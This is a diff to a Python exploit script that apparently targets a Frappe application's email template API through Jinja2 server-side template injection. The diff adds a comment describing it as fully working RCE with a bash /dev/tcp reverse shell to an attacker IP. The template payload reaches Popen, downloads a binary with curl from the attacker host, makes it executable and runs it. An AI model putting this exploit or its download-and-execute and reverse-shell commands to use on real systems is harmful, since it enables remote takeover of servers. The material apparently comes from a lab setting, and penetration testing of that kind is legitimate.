@@ -106,22 +106,23 @@ def create_email_template(session, url, user, template_name, ssti,proxies=None):
         print(F"Error in create_email_template: {res.status_code}, {res.content}")
         exit(1)
 
+# fully working rce => reverse shell
+# contents of shell: /bin/bash -i >& /dev/tcp/192.168.119.139/4444 0>&1
 '''
 {% set string = "ssti" %}
 {% set class = "__class__" %}
 {% set mro = "__mro__" %}
 {% set subclasses = "__subclasses__" %}
-
 {% set mro_r = string|attr(class)|attr(mro) %}
 {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
 {% for x in subclasses_r %}
 {% if 'Popen' in x|attr('__qualname__')%}
 {{ x(["/usr/bin/touch" ,"/tmp/bananas"]) }}
-{{ x(["/usr/bin/curl" ,"http://192.168.119.139/jinja-ssti-test-env/shell-x86.elf", "-o", "/tmp/simpdaddy"]) }}
+{{ x(["/usr/bin/curl" ,"http://192.168.119.139/jinja-ssti-test-env/shell", "-o", "/tmp/simpdaddy"]) }}
 {{ x(["/bin/chmod" ,"+x", "/tmp/simpdaddy"]) }}
-{{ x(["/tmp/simpdaddy"]) }}
+{{ x(["/bin/bash","-c","/tmp/simpdaddy"]) }}
 {% endif %}
-{% endfor %}
+{% endfor %}  
 '''
 def trigger_ssti_email_template(session, url, template_name, user, ssti, proxies=None):
     url += 'api/method/frappe.email.doctype.email_template.email_template.get_email_template'
